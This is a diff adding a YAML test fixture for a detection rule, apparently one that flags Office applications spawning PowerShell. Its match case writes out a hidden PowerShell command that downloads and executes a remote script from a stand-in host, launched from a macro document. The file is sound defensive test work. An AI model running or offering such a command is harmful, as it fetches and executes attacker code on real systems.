@@ -1,0 +1,17 @@
+rule_id: a18379ca-9800-4fc3-853a-378d12a382c7
+cases:
+  - name: Word macro launching PowerShell
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell -w hidden -c "iwr http://198.51.100.9/s.ps1|iex"'
+      ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+      ParentCommandLine: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\jdoe\Downloads\Invoice_7731.docm"'
+      User: 'OPENSOC\jdoe'
+  - name: Excel opening the Office click-to-run updater
+    expect: no_match
+    event:
+      Image: 'C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeC2RClient.exe'
+      CommandLine: '"C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeC2RClient.exe" /frequentupdate SCHEDULEDTASK'
+      ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE'
+      User: 'OPENSOC\jdoe'
